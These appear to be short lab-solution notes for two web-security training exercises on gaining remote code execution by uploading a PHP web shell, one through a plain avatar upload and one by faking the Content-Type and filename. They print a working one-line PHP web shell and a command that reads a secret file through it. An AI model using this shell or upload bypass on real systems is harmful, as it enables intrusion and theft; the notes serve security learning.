# Lab: Remote code execution via web shell upload

Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> Go back to my-account -> Right click the image and view it in a new tab -> The url looks like [id]/files/avatars/shell.php -> get the answer: `files/avatars/shell.php?command=cat /home/carlos/secret`


# Lab: Web shell upload via Content-Type restriction bypass

Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> capture that request -> Change Content-type to image/png and also change the filename from shell.php to shell.png.php -> send -> see the response in browser, its uploaded -> follow previous method


